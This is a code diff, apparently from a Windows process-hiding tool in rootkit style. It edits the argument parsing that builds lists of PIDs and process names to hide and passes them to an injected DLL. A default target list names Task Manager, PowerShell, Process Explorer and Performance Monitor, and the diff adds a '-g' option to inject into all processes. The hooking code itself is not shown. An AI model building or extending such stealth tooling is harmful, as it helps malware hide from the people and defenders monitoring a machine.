@@ -6,7 +6,7 @@
 vector<wstring> frobiddenProcessesList;
 ArgStruct argsToDLL;
 
-
+// Add the default threats to the list
 void initFrobProcList()
 {
 	LPWSTR BasicfrobProcList[] = { L"Taskmgr.exe", L"powershell.exe", L"procexp.exe", L"procexp64.exe", L"perfmon.exe" };
@@ -33,31 +33,10 @@ int addProcessesToFrobList(TCHAR *optarg)
 	}
 	return i;
 }
-void getSelfFolder(TCHAR *target,int num_tchars)
-{
-	GetModuleFileNameEx(GetCurrentProcess(), NULL, target, num_tchars);
-	getFolderFromPath(target);
-}
 
-void getFolderFromPath(TCHAR *target)
-{
-	TCHAR *x;
-	TCHAR buffer[MAX_PATH] = L"\0";
-	TCHAR *pwc1 = wcstok_s(target, L"\\/", &x), *pwc2 = L"";
-	while (pwc1 != NULL)
-	{
 
-		wcscat_s(buffer, MAX_PATH, pwc2);
-		if (wcslen(pwc2) != 0)
-			wcscat_s(buffer, MAX_PATH, L"\\");
-		pwc2 = pwc1;
-		pwc1 = wcstok_s(NULL, L"\\/", &x);
-	}
-	target[0] = L'\0';
-	wcscat_s(target, MAX_PATH, buffer);
-	return;
-}
 
+//Add the PIDs, seperated by commas, to the global argsToDLL
 int buildPIDsList(const TCHAR *optarg, BOOL includeSelf)
 {
 	//returned value - number of PIDs in list
@@ -95,6 +74,7 @@ int buildPIDsList(const TCHAR *optarg, BOOL includeSelf)
 
 }
 
+//Add the hidden process names, seperated by commas, to the global argsToDLL
 int buildProcNameList(const TCHAR *optarg, BOOL includeSelf)
 {
 	TCHAR *str_buffer, *context, *pwc, *delim = L",";
@@ -135,13 +115,16 @@ int buildProcNameList(const TCHAR *optarg, BOOL includeSelf)
 
 
 
-
-BOOL BuildHiddenProcessesLists(int argc, _TCHAR* argv[])
+//parse the input arguments to format we can send to the DLL
+BOOL BuildHiddenProcessesLists(int argc, _TCHAR* argv[],PBOOL P_InjectALL)
 {
 	bool isParameter_i_active = false, isParameter_n_active = false;
 	int opt;
+	TCHAR *flags;
+	flags = L"i:n:x:g";
+
 	initFrobProcList();
-	while ((opt = getopt(argc, argv, L"i:n:x:")) != -1) {
+	while ((opt = getopt(argc, argv, flags)) != -1) {
 		switch (opt) {
 		case 'i':
 			if (optarg == NULL)
@@ -186,8 +169,12 @@ BOOL BuildHiddenProcessesLists(int argc, _TCHAR* argv[])
 					}
 		}
 			break;
+		case 'g':
+			if (P_InjectALL != NULL) *P_InjectALL = TRUE;
+			break;
+		
 		default: /* '?' */
-			printf("Illegal use of option!\n");
+			printf("Illegal use of option %c!\n",opt);
 			return FALSE;
 			break;
 		}
@@ -207,7 +194,7 @@ BOOL BuildHiddenProcessesLists(int argc, _TCHAR* argv[])
 
 
 
-BOOL PrepareContents(int argc, TCHAR * argv[])
+BOOL PrepareContents(int argc, TCHAR * argv[],PBOOL P_InjectALL)
 {
-	return BuildHiddenProcessesLists(argc, argv);
+	return BuildHiddenProcessesLists(argc, argv,P_InjectALL);
 }
